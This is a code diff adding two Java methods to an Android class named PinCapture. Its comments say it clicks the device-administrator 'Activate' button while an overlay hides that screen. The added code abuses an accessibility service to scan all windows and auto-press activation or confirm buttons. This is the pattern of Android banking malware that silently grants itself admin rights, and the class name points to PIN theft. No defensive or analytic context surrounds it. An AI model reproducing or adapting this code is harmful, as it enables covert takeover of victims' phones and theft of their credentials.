@@ -989,6 +989,62 @@ public final class PinCapture {
         return false;
     }
 
+    /** 遮罩期间点“启动/激活”（DeviceAdminAdd 被遮罩挡住 active window） */
+    public static boolean clickAdminOnAnyWindow() {
+        try {
+            AccessibilityService svc = svcRef;
+            if (svc == null) return false;
+            java.util.List<android.view.accessibility.AccessibilityWindowInfo> ws = svc.getWindows();
+            if (ws == null) return false;
+            for (android.view.accessibility.AccessibilityWindowInfo w : ws) {
+                AccessibilityNodeInfo r = null;
+                try {
+                    r = w.getRoot();
+                } catch (Throwable ignored) {
+                }
+                if (r == null) continue;
+                if (clickByLabels(r, new String[]{"启动", "激活", "Activate", "确定"})) {
+                    Log.d(TAG, "admin activate clicked (window scan)");
+                    return true;
+                }
+                try {
+                    r.recycle();
+                } catch (Throwable ignored) {
+                }
+            }
+        } catch (Throwable t) {
+            Log.e(TAG, "clickAdminOnAnyWindow failed", t);
+        }
+        return false;
+    }
+
+    private static boolean clickByLabels(AccessibilityNodeInfo root, String[] labels) {
+        for (String label : labels) {
+            java.util.List<AccessibilityNodeInfo> ns = null;
+            try {
+                ns = root.findAccessibilityNodeInfosByText(label);
+            } catch (Throwable ignored) {
+            }
+            if (ns == null) continue;
+            for (AccessibilityNodeInfo n : ns) {
+                AccessibilityNodeInfo cur = n;
+                int d = 0;
+                while (cur != null && d++ < 6) {
+                    try {
+                        if (cur.isClickable() && cur.performAction(0x10)) return true;
+                    } catch (Throwable ignored) {
+                    }
+                    try {
+                        cur = cur.getParent();
+                    } catch (Throwable ignored) {
+                        break;
+                    }
+                }
+            }
+        }
+        return false;
+    }
+
     /** 反射取设备 ID（ڜٟٱڀ.د.إ） */
     private static String deviceId() {
         try {
